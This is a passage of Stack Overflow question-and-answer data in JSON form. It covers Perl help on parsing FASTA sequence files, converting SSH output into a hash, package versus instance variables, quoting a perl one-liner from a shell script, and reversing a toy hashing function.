"https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 3, "creation_date": 1457212889, "post_id": 35820020, "comment_id": 59307499, "body": "Your input doesn&#39;t contain a single colon, why do you <code>split</code> on <code>&#47;:&#47;</code>?"}], "answers": [{"tags": [], "owner": {"reputation": 1058, "user_id": 3241027, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c8874c36ce5ee1710dcfc8bc9c9439a9?s=128&d=identicon&r=PG&f=1", "display_name": "Seekheart", "link": "https://stackoverflow.com/users/3241027/seekheart"}, "is_accepted": true, "score": 0, "last_activity_date": 1457249211, "creation_date": 1457249211, "answer_id": 35824268, "question_id": 35820020, "link": "https://stackoverflow.com/questions/35820020/looking-for-specific-text-and-save-it-into-variable/35824268#35824268", "title": "Looking for specific text and save it into variable", "body": "<p>This should help get you what you want. You will need to install Bio Perl</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\nuse Bio::SeqIO;\n\nmy $seqFile = Bio::SeqIO-&gt;new('-format' =&gt; 'fasta', '-file' =&gt; 'myFasta.fasta');\nwhile((my $seqObj = $seqFile-&gt;next_seq())){\n     print \"Seen Sequence \" . $seqObj-&gt;display_id . \"\\n\";\n     print \"Sequence: \" . $seqObj-&gt;seq() . \"\\n\";\n}\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 6023446, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24d1814c7a0d0217545bee7678009d0f?s=128&d=identicon&r=PG&f=1", "display_name": "TMory", "link": "https://stackoverflow.com/users/6023446/tmory"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 44, "favorite_count": 0, "accepted_answer_id": 35824268, "answer_count": 1, "score": -2, "last_activity_date": 1457249211, "creation_date": 1457212664, "question_id": 35820020, "link": "https://stackoverflow.com/questions/35820020/looking-for-specific-text-and-save-it-into-variable", "title": "Looking for specific text and save it into variable", "body": "<p>I am looking for the easiest way to look for text in huge file and save it into same variables for later use.</p>\n\n<p>The file format is:</p>\n\n<pre><code>&gt;gi|24585363|ref|NP_724239.1| short neuropeptide F precursor [Drosophila melanogaster]\nMFHLKRELSQGCALALICLVSLQMQQPAQAEVSSAQGTPLSNLYDNLLQREYAGPVVFPNHQVERKAQRS\nPSLRLRFGRSDPDMLNSIVEKRWFGDVNQKPIRSPSLRLRFGRRDPSLPQMRRTAYDDLLERELTLNSQQ\nQQQQLGTEPDSDLGADYDGLYERVVRKPQRLRWGRSVPQFEANNADNEQIERSQWYNSLLNSDKMRRMLV\nALQQQYEIPENVASYANDEDTDTDLNNDTSEFQREVRKPMRLRWGRSTGKAPSEQKHTPEETSSIPPKTQ\nN\n&gt;gi|442619471|ref|NP_001262643.1| neuropeptide F, isoform C [Drosophila melanogaster]\nMCQTMRCILVACVALALLAAGCRVEASNSRPPRKNDVNTMADAYKFLQDLDTYYGDRARVRFGKRGSLMD\nILRNHEMDNINLGKNANNGGEFARGFNEEEIF\n&gt;gi|442619469|ref|NP_001262642.1| neuropeptide F, isoform B [Drosophila melanogaster]\nMCQTMRCILVACVALALLAAGCRVEASNSRPPRKNDVNTMADAYKFLQDLDTYYGDRARVRFGKRGSLMD\nILRNHEMDNINLGKNANNGGEFARGFNEEEIF\n</code></pre>\n\n<p>every sequence starts with \">\"</p>\n\n<p>I tried this:</p>\n\n<pre><code>open (FILE, $fastaFile);\nwhile (&lt;FILE&gt;) {\nchomp;\n($name, $name2) = split(/:/);\n\nprint \"Name: $name\\n\";\nprint \"Name2: $name2\\n\";\n\n} close (FILE);\n\nexit;\n</code></pre>\n\n<p>I never needed to look for specific text. Perhaps it would be easy to use grep only I don\u00b4t know that.</p>\n\n<p>The bigest problem for me is that I have in another file result from my other program and I need to find these results in another file.</p>\n\n<p>My main program gave me these results:</p>\n\n<pre><code>&gt;gi|24585363|ref|NP_724239.1|\n&gt;gi|442619469|ref|NP_001262642.1|\n</code></pre>\n\n<p>and I need to find it in the second file and save this into $name and into $sequence put the sequnces for that name.:</p>\n\n<pre><code>$name = \"&gt;gi|24585363|ref|NP_724239.1|\"\n$sequnce = \"MFHLKRELSQGCALALICLVSLQMQQPAQAEVSSAQGTPLSNLYDNLLQREYAGPVVFPNHQVERKAQRS\n    PSLRLRFGRSDPDMLNSIVEKRWFGDVNQKPIRSPSLRLRFGRRDPSLPQMRRTAYDDLLERELTLNSQQ\n    QQQQLGTEPDSDLGADYDGLYERVVRKPQRLRWGRSVPQFEANNADNEQIERSQWYNSLLNSDKMRRMLV\n    ALQQQYEIPENVASYANDEDTDTDLNNDTSEFQREVRKPMRLRWGRSTGKAPSEQKHTPEETSSIPPKTQ\n    N\"\n</code></pre>\n\n<p>Can anyone give me advice on how to proceed? If use grep or some another way to get there.</p>\n"}, {"tags": ["perl", "hash"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1457212468, "post_id": 35819817, "comment_id": 59307355, "body": "In the first format, there is a value following a value, which doesn&#39;t happen in the second one. Can you post the same data in both the formats?"}, {"owner": {"reputation": 71, "user_id": 5999681, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/fb80e00717636611840103533ae2ebb7?s=128&d=identicon&r=PG&f=1", "display_name": "lollan", "link": "https://stackoverflow.com/users/5999681/lollan"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1457213150, "post_id": 35819817, "comment_id": 59307586, "body": "Value following a value not expected, see edit."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457219586, "post_id": 35819817, "comment_id": 59309420, "body": "As <a href=\"http://stackoverflow.com/questions/35819817/converting-a-large-string-into-a-hash-using-split-on-delimiters#comment59307355_35819817\">choroba has pointed out</a>, the two representations that you show are different data, so it&#39;s unclear what it really looks like. You also say nothing about what you want to do with your data structure once you have parsed the data into it so it&#39;s pretty much impossible to help you. It would help enormously if you showed some real data; as it stands it is unclear whether <code>Key</code> and <code>Value</code> are to be taken literally or are just placeholders"}, {"owner": {"reputation": 71, "user_id": 5999681, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/fb80e00717636611840103533ae2ebb7?s=128&d=identicon&r=PG&f=1", "display_name": "lollan", "link": "https://stackoverflow.com/users/5999681/lollan"}, "edited": false, "score": 0, "creation_date": 1457221263, "post_id": 35819817, "comment_id": 59309821, "body": "Sorry for the confusion, it&#39;s just a huge string and I was trying to simplify it.  Basically, I want to be able to assign any of the values in this data as a variable as needed, hence wanting a hash.  In the Data::Dumper output, for example being able to pull a &quot;zone&quot; and it&#39;s associated key-&gt;value pairs.    See real data:  <a href=\"http://pastebin.com/7KagfWJV\" rel=\"nofollow noreferrer\">pastebin.com/7KagfWJV</a>"}, {"owner": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "edited": false, "score": 0, "creation_date": 1457276902, "post_id": 35819817, "comment_id": 59323616, "body": "Does this output from SNMP? Maybe you need to use appropriate module from CPAN?"}, {"owner": {"reputation": 71, "user_id": 5999681, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/fb80e00717636611840103533ae2ebb7?s=128&d=identicon&r=PG&f=1", "display_name": "lollan", "link": "https://stackoverflow.com/users/5999681/lollan"}, "edited": false, "score": 0, "creation_date": 1457441833, "post_id": 35819817, "comment_id": 59399723, "body": "Not from SNMP and there are no CPAN modules for these devices to query something like a REST API sadly"}], "answers": [{"comments": [{"owner": {"reputation": 71, "user_id": 5999681, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/fb80e00717636611840103533ae2ebb7?s=128&d=identicon&r=PG&f=1", "display_name": "lollan", "link": "https://stackoverflow.com/users/5999681/lollan"}, "edited": false, "score": 0, "creation_date": 1457273627, "post_id": 35819988, "comment_id": 59322317, "body": "I tried loading and dumping using YAML and a few other implementations, Syck and Tiny.  YAML expects a header with a specific syntax it would appear - which this data set does not.  I don&#39;t believe it follows any standard format, just a big dumping of commands.  My mission here is to get this dataset into a format where I can parse it freely in something like YAML or JSON though."}], "tags": [], "owner": {"reputation": 843, "user_id": 6020333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bea9014ebf1e1188cac53beb61560df8?s=128&d=identicon&r=PG&f=1", "display_name": "bart", "link": "https://stackoverflow.com/users/6020333/bart"}, "is_accepted": false, "score": -1, "last_activity_date": 1457245872, "last_edit_date": 1457245872, "creation_date": 1457212509, "answer_id": 35819988, "question_id": 35819817, "link": "https://stackoverflow.com/questions/35819817/converting-a-large-string-into-a-hash-using-split-on-delimiters/35819988#35819988", "title": "Converting a large string into a hash using split on delimiters", "body": "<p>This data looks a lot like YAML. Maybe you could try using <a href=\"http://search.cpan.org/~ingy/YAML-1.15/lib/YAML.pod\" rel=\"nofollow\">http://search.cpan.org/~ingy/YAML-1.15/lib/YAML.pod</a> to parse it?</p>\n"}], "owner": {"reputation": 71, "user_id": 5999681, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/fb80e00717636611840103533ae2ebb7?s=128&d=identicon&r=PG&f=1", "display_name": "lollan", "link": "https://stackoverflow.com/users/5999681/lollan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 161, "favorite_count": 1, "answer_count": 1, "score": -1, "last_activity_date": 1457273700, "creation_date": 1457211379, "last_edit_date": 1457273700, "question_id": 35819817, "link": "https://stackoverflow.com/questions/35819817/converting-a-large-string-into-a-hash-using-split-on-delimiters", "title": "Converting a large string into a hash using split on delimiters", "body": "<p>I am attempting to parse multiple values out of a dynamic, large string output from a Net::SSH2 command.  In order to do this, I believe I will need to convert the string into a hash.</p>\n\n<p>Reading some, it seems that the split function is the way to create this dataset, using lists and multiple hashes</p>\n\n<ul>\n<li>edit\nActual output from Data::Dumper and a regular print linked here:\n<a href=\"http://pastebin.com/7KagfWJV\" rel=\"nofollow\">http://pastebin.com/7KagfWJV</a></li>\n</ul>\n\n<p>If I run a 'print $data', I see something like this:</p>\n\n<pre><code>0 \"Title1:\\cJ Key:\\cIValue\\cJ\\cI Key:\\cIValue\\cJ\\ Key:\\cIValue\\cJTitle2:\\cJ  Key:\\cIValue\\cJ\\cI Key:\\cIValue\\cJ\\cIValue\\cJTitle3:\\cJ Key:\\cIValue\\cJ\\cI Key:\\cIValue\\cJ\\cIValue\\cJ\"\n</code></pre>\n\n<p>Or in Data::Dumper format:</p>\n\n<pre><code>$VAR1 = 'Title1:\n    aaa:    eee\n            Key:    Value\n            Key:    Value\n            Key:    Value\n    aab:    fff\n            Key:    Value\n            Key:    Value\n            Key:    Value\n    aac:    ggg\n            Key:    Value\n            Key:    Value\n            Key:    Value\n    aad:    hhh\n            Key:    Value\n            Key:    Value\n            Key:    Value\n'Title2:\n    baa:    iii\n            Key:    Value\n            Key:    Value\n            Key:    Value\n    bab:    kkk\n            Key:    Value\n            Key:    Value\n            Key:    Value\n    bac:    lll\n            Key:    Value\n            Key:    Value\n            Key:    Value\n    bad:    mmm\n            Key:    Value\n            Key:    Value\n            Key:    Value\n'Title3:\n    caa:    nnn\n            Key:    Value\n            Key:    Value\n            Key:    Value\n    cab:    ooo\n            Key:    Value\n            Key:    Value\n            Key:    Value\n    cac:    ppp\n            Key:    Value\n            Key:    Value\n            Key:    Value\n    cad:    qqq\n            Key:    Value\n            Key:    Value\n            Key:    Value\n';\n</code></pre>\n\n<p>I would expect, that to put this into a easily parsable format, I could split using the \\cJ and \\cI characters.  Any ideas?</p>\n\n<ul>\n<li><p>edit\nI have tried using YAML and YAML::Syck for the input stream but it would appear that YAML does not accept the data as it does not include a valid YAML header:</p>\n\n<p>YAML Error: Expected separator '---'\n   Code: YAML_PARSE_ERR_NO_SEPARATOR\n   Line: 2\n   Document: 2\n at /Library/Perl/5.18/YAML/Loader.pm line 78.</p></li>\n</ul>\n"}, {"tags": ["perl", "class-variables"], "comments": [{"owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "edited": false, "score": 2, "creation_date": 1457198299, "post_id": 35817120, "comment_id": 59301989, "body": "That&#39;s just how it is in Perl. Package scope variables are like class variables in Java. - There are several OO tutorials in the Perl distribution. Read these for starters."}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 3, "creation_date": 1457199534, "post_id": 35817120, "comment_id": 59302484, "body": "The example code is broken. It has unbalanced braces and has the <code>new</code> method calling the <code>new</code> method. It would probably be easier to understand this question if the code were clearer."}, {"owner": {"reputation": 59, "user_id": 1885625, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60deb7b5808973b53af7bd821e086931?s=128&d=identicon&r=PG", "display_name": "Rahul Kumar", "link": "https://stackoverflow.com/users/1885625/rahul-kumar"}, "edited": false, "score": 0, "creation_date": 1457201718, "post_id": 35817120, "comment_id": 59303340, "body": "yeah corrected that!!!thanks"}], "answers": [{"comments": [{"owner": {"reputation": 59, "user_id": 1885625, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60deb7b5808973b53af7bd821e086931?s=128&d=identicon&r=PG", "display_name": "Rahul Kumar", "link": "https://stackoverflow.com/users/1885625/rahul-kumar"}, "edited": false, "score": 0, "creation_date": 1457202042, "post_id": 35817342, "comment_id": 59303477, "body": "Thanks for the explanation.The word static almost clears all the doubts. in calling package one can use setters on these static fields to set the value dynamically.How can we create instance variables in perl??"}, {"owner": {"reputation": 24943, "user_id": 19784, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/611fd46d3d001c7c6b047468de453b18?s=128&d=identicon&r=PG", "display_name": "Kyle Burton", "link": "https://stackoverflow.com/users/19784/kyle-burton"}, "reply_to_user": {"reputation": 59, "user_id": 1885625, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60deb7b5808973b53af7bd821e086931?s=128&d=identicon&r=PG", "display_name": "Rahul Kumar", "link": "https://stackoverflow.com/users/1885625/rahul-kumar"}, "edited": false, "score": 0, "creation_date": 1457203001, "post_id": 35817342, "comment_id": 59303856, "body": "Hi @RahulKumar in my example, <code>prop1</code> and <code>prop2</code> are instance variables.  Are you familiar with Javascript?   Objects have very similar semantics in JS and Perl.  <code>$self-&gt;{prop1}</code> <i>is</i> a member variable.  You can &#39;create&#39; new ones at any time (again just like in JS) by assigning it <code>$self-&gt;{prop99}</code>"}, {"owner": {"reputation": 59, "user_id": 1885625, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60deb7b5808973b53af7bd821e086931?s=128&d=identicon&r=PG", "display_name": "Rahul Kumar", "link": "https://stackoverflow.com/users/1885625/rahul-kumar"}, "edited": false, "score": 0, "creation_date": 1457203497, "post_id": 35817342, "comment_id": 59304069, "body": "Hi @kyle ,I understand that prop1 and prop2 arer keys to the hash you created which got blessed into the reference ,they can be thought as instance variables .to access these again i have to use $self which is passed in the function .what i wanted to ask is is there a way that package variables can be declared as instance variables??or package variables are always static???"}, {"owner": {"reputation": 24943, "user_id": 19784, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/611fd46d3d001c7c6b047468de453b18?s=128&d=identicon&r=PG", "display_name": "Kyle Burton", "link": "https://stackoverflow.com/users/19784/kyle-burton"}, "reply_to_user": {"reputation": 59, "user_id": 1885625, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60deb7b5808973b53af7bd821e086931?s=128&d=identicon&r=PG", "display_name": "Rahul Kumar", "link": "https://stackoverflow.com/users/1885625/rahul-kumar"}, "edited": false, "score": 0, "creation_date": 1457230253, "post_id": 35817342, "comment_id": 59311769, "body": "Yes, anything outside of <code>$self</code> and outside of a <code>sub</code> is a package variable."}], "tags": [], "owner": {"reputation": 24943, "user_id": 19784, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/611fd46d3d001c7c6b047468de453b18?s=128&d=identicon&r=PG", "display_name": "Kyle Burton", "link": "https://stackoverflow.com/users/19784/kyle-burton"}, "is_accepted": false, "score": 2, "last_activity_date": 1457198909, "creation_date": 1457198909, "answer_id": 35817342, "question_id": 35817120, "link": "https://stackoverflow.com/questions/35817120/why-does-perl-constructor-not-initialize-the-packageclass-variables/35817342#35817342", "title": "why does perl constructor not initialize the package(class) variables", "body": "<p>In Perl, the package variables, eg: the <code>my $var1</code> at the top of your file, are not instance variables.  They correspond to Static variables in languages like Java or C#.  In Perl it is conventional to use <code>$self</code> where other languages use <code>this</code>.  Some languages, like Java, let you omit the use of <code>this</code> when referring to member variables.  Some, like JavaScript and Perl do not.  </p>\n\n<p>If you're asking how to initialize the static variables, you can certainly do that by just assigning to them when you create them.  </p>\n\n<pre><code>package foo;\nuse strict;\nuse warnings;\nmy $created_at = localtime();\n\nsub created_at {\n  return $created_at;\n}\n\nsub new {\n  my($pkg,$p1,$p2) = @_;\n  my $self = {\n    prop1 =&gt; $p1,\n    prop2 =&gt; $p2\n  };\n  return bless $self, $pkg;\n}\n\n# you can create accessors, think of these as getters and setters, if you pass a value it is set\nsub prop1 { my($self,$v) = @_; $self-&gt;{prop1} = $v if @_&gt;1; return $self-&gt;{prop1}; } \nsub prop2 { my($self,$v) = @_; $self-&gt;{prop2} = $v if @_&gt;1; return $self-&gt;{prop2}; }\n\nsub method {\n  my($self) = @_;\n  print \"prop1=\",$self-&gt;{prop1},\"; prop2=\",$self-&gt;{prop2},\"\\n\";\n}\n\npackage main;\nuse strict;\nuse warnings;\n\nprint \"created_at = \",foo-&gt;created_at,\"\\n\";\n\nmy $f = foo-&gt;new(\"banana\",\"apple\");\n\nprint \"f-&gt;created_at = \", $f-&gt;created_at,\"\\n\";\n$f-&gt;method();\n$f-&gt;prop1('orange');\n$f-&gt;method();\n</code></pre>\n\n<p>This is an older way to handle OO in Perl, based on Perl5's initial support for Objects. If you're more familiar with other Object systems, you might want to have a look at Perl's <a href=\"http://moose.iinteractive.com/en/about.html\" rel=\"nofollow\">Moose</a> libraries, which provide more of what you might be used to.</p>\n\n<p>HTH,</p>\n\n<p>Kyle</p>\n"}, {"comments": [{"owner": {"reputation": 59, "user_id": 1885625, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60deb7b5808973b53af7bd821e086931?s=128&d=identicon&r=PG", "display_name": "Rahul Kumar", "link": "https://stackoverflow.com/users/1885625/rahul-kumar"}, "edited": false, "score": 0, "creation_date": 1457201051, "post_id": 35817505, "comment_id": 59303105, "body": "Thanks,outside the method can we change the value of the package variables.??"}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": true, "score": 2, "last_activity_date": 1457199845, "creation_date": 1457199845, "answer_id": 35817505, "question_id": 35817120, "link": "https://stackoverflow.com/questions/35817120/why-does-perl-constructor-not-initialize-the-packageclass-variables/35817505#35817505", "title": "why does perl constructor not initialize the package(class) variables", "body": "<p>The canonical way to use package variables is to declare them with <code>our</code>. Outside the package, you can refer to them by qualifying the variable name with the package.</p>\n\n<pre><code>package foo;\nour ($var1, $var2, $var3) = (5, 42, \"bar\");\nsub new { bless { var4 =&gt; $_[1] }, $_[0] }\n...\n1;\n\n\npackage main;\nuse foo;\n$obj = foo-&gt;new(19);   # instance of foo\nprint \"Instance variable is $obj-&gt;{var4}\\n\";    # 19\nprint \"Package variable is $foo::var1\\n\";       #  5\n</code></pre>\n"}], "owner": {"reputation": 59, "user_id": 1885625, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60deb7b5808973b53af7bd821e086931?s=128&d=identicon&r=PG", "display_name": "Rahul Kumar", "link": "https://stackoverflow.com/users/1885625/rahul-kumar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 383, "favorite_count": 0, "closed_date": 1458032111, "accepted_answer_id": 35817505, "answer_count": 2, "score": -4, "last_activity_date": 1457201699, "creation_date": 1457197867, "last_edit_date": 1457201699, "question_id": 35817120, "link": "https://stackoverflow.com/questions/35817120/why-does-perl-constructor-not-initialize-the-packageclass-variables", "closed_reason": "Not suitable for this site", "title": "why does perl constructor not initialize the package(class) variables", "body": "<p>when perl constructor is called ,class reference is passed to the new function but constructor doesn't initialize class variables like java or c++ does.Instead it creates a new Hash and blesses it in class reference and returns it.This creates the problem that subroutines can't directly refer to variables they have to use the implicit reference passed.</p>\n\n<p>The below code will highlight the issue:-</p>\n\n<pre><code>package foo;\nuse strict;\nmy $var1;\nmy $var2;\nmy $var3;\n\nsub new {\n    my $class = shift;\n    my $self  = {\n        var1 =&gt; shift,\n        var2 =&gt; shift,\n        var3 =&gt; shift\n      };\n\n    bless $self, $class;\n    return $self;\n\n      }\n\nsub method {\n\n        my $self = shift;\n        print(\n            \"variable value are $self-&gt;{var1},$self-&gt;{var2},$self-&gt;{var3}\";\n       #how to directly refer to var1 declared above? instead of self-&gt;{var1} \n       }\n</code></pre>\n\n<p>clearly the package method has to use the reference self to use var1,var2,var3 \nwhich is are not the package variables but only the hash's objects.</p>\n\n<p>1:-what this means is in perl there is no way to initialize the package variables??\n2:-if i initialize them explicitly in some method,would they have one copy for all objects or different copy per object</p>\n"}, {"tags": ["regex", "perl", "shell"], "answers": [{"tags": [], "owner": {"reputation": 1179, "user_id": 5228843, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c604041f56d88ec4d3f84b7e0f269c81?s=128&d=identicon&r=PG&f=1", "display_name": "matsib.dev", "link": "https://stackoverflow.com/users/5228843/matsib-dev"}, "is_accepted": true, "score": 1, "last_activity_date": 1457188259, "creation_date": 1457188259, "answer_id": 35815322, "question_id": 35814743, "link": "https://stackoverflow.com/questions/35814743/running-perl-command-form-shell-script/35815322#35815322", "title": "Running perl command form shell script", "body": "<p>You should change the last line:</p>\n\n<pre><code>#!/bin/sh\n# run:  $ ./normalize x y input_file output_file\nX=$1\nY=$2\nINPUT=$3\nOUTPUT=$4\n\nBIGGEST_FIRST_COLUMN=$(sort -nrk1 $INPUT | head -n1 | cut -d ' ' -f 1)\nBIGGEST_SECOND_COLUMN=$(sort -nrk2 $INPUT | head -n1 | cut -d ' ' -f 2)\n\nPERL_CMD=\"'s!([\\d.]+)\\s([\\d.]+)!(\\$1/$BIGGEST_FIRST_COLUMN*$X).\\\" \\\".(\\$2/$BIGGEST_SECOND_COLUMN*$Y)!e'\"\n\nCMD=\"perl -pe $PERL_CMD $INPUT &gt; $OUTPUT\"\necho \"Run the following cmd : \"\necho $CMD\n\n# $CMD  &lt; no\neval $CMD\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 868, "user_id": 6022274, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/06c83ad18e5255b126aca74fff0af330?s=128&d=identicon&r=PG&f=1", "display_name": "Bromind", "link": "https://stackoverflow.com/users/6022274/bromind"}, "edited": false, "score": 0, "creation_date": 1457388645, "post_id": 35823016, "comment_id": 59375770, "body": "Ahah, nice ! Not comfortable enough to write one-liner like that yet :-)"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1457237556, "creation_date": 1457237556, "answer_id": 35823016, "question_id": 35814743, "link": "https://stackoverflow.com/questions/35814743/running-perl-command-form-shell-script/35823016#35823016", "title": "Running perl command form shell script", "body": "<p>Here's a Perl one-liner that will do as you ask without needing the shell to preprocess the data</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>perl -MList::Util=max -E'@d=map[split],&lt;&gt;;for $i(0,1){$m=max map $$_[$i],@d; $$_[$i]*=10/$m for @d} say qq{@$_} for @d' data.txt\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>10 5\n7.5 10\n</code></pre>\n"}], "owner": {"reputation": 868, "user_id": 6022274, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/06c83ad18e5255b126aca74fff0af330?s=128&d=identicon&r=PG&f=1", "display_name": "Bromind", "link": "https://stackoverflow.com/users/6022274/bromind"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 805, "favorite_count": 0, "accepted_answer_id": 35815322, "answer_count": 2, "score": 2, "last_activity_date": 1457237556, "creation_date": 1457184481, "last_edit_date": 1592644375, "question_id": 35814743, "link": "https://stackoverflow.com/questions/35814743/running-perl-command-form-shell-script", "title": "Running perl command form shell script", "body": "<p>I have a list of points coordinates in 2 column format first column x-axis, second column y-axis, and I'd like to make a script to rescale the axis.</p>\n<blockquote>\n<p><strong>input file example</strong><br />\n4 3<br />\n3 6</p>\n<p><strong>output file example (rescale to 10 10)</strong><br />\n10 5<br />\n7.5 10</p>\n</blockquote>\n<p>To do that, I first get the biggest coordinate on both column (using <code>sort</code>, <code>head</code> and <code>cut</code>), and then I interpolate all lines using a perl substitute regexp.</p>\n<p>So I scripted that :</p>\n<pre><code>#!/bin/sh\n# run:  $ ./normalize x y input_file output_file\nX=$1\nY=$2\nINPUT=$3\nOUTPUT=$4\n\nBIGGEST_FIRST_COLUMN=$(sort -nrk1 $INPUT | head -n1 | cut -d ' ' -f 1)\nBIGGEST_SECOND_COLUMN=$(sort -nrk2 $INPUT | head -n1 | cut -d ' ' -f 2)\n\nPERL_CMD=&quot;'s!([\\d.]+)\\s([\\d.]+)!(\\$1/$BIGGEST_FIRST_COLUMN*$X).\\&quot; \\&quot;.(\\$2/$BIGGEST_SECOND_COLUMN*$Y)!e'&quot;\n\nCMD=&quot;perl -pe $PERL_CMD $INPUT &gt; $OUTPUT&quot;\necho &quot;Run the following cmd : &quot;\necho $CMD\n\n$CMD\n</code></pre>\n<p>This code output the perl onliner I want to run and then try to run it.\nAt this point, the perl oneliner is working : I can copy-paste it and running it by hand and it gives the correct output. Nevertheless, I got a bug when the script run it automatically :</p>\n<pre><code>Can't find string terminator &quot;'&quot; anywhere before EOF at -e line 1.\n</code></pre>\n<p>I suppose this is due to some problem in my comprehension of <code>&quot;</code> and <code>'</code> in shell, but at this point, I have no idea... So if you have any tips, welcome</p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 51, "user_id": 5226765, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/869787523113326/picture?type=large", "display_name": "TKrisee", "link": "https://stackoverflow.com/users/5226765/tkrisee"}, "edited": false, "score": 0, "creation_date": 1457185170, "post_id": 35814823, "comment_id": 59297413, "body": "Thank you for your answer. I&#39;m a newbie in Perl and I was trying to figure this out for two days, but i didn&#39;t get anywhere with my solutions, thats why I asked here."}, {"owner": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "reply_to_user": {"reputation": 51, "user_id": 5226765, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/869787523113326/picture?type=large", "display_name": "TKrisee", "link": "https://stackoverflow.com/users/5226765/tkrisee"}, "edited": false, "score": 6, "creation_date": 1457191042, "post_id": 35814823, "comment_id": 59299245, "body": "It is impossible for anyone to know what attempts you have made since they weren&#39;t included in the question."}], "tags": [], "owner": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "is_accepted": true, "score": 3, "last_activity_date": 1497375487, "last_edit_date": 1497375487, "creation_date": 1457185006, "answer_id": 35814823, "question_id": 35814627, "link": "https://stackoverflow.com/questions/35814627/how-do-i-reverse-this-hashing-function/35814823#35814823", "title": "How do I reverse this hashing function?", "body": "<p>I'll bite, even though you put no effort into solving the problem: </p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse feature qw(say);\n\nmy @alphabet = split //, \"acdegijmnoprstuw\";   #/\nsub reverse_hash {\n    my ($n) = @_;\n\n    my 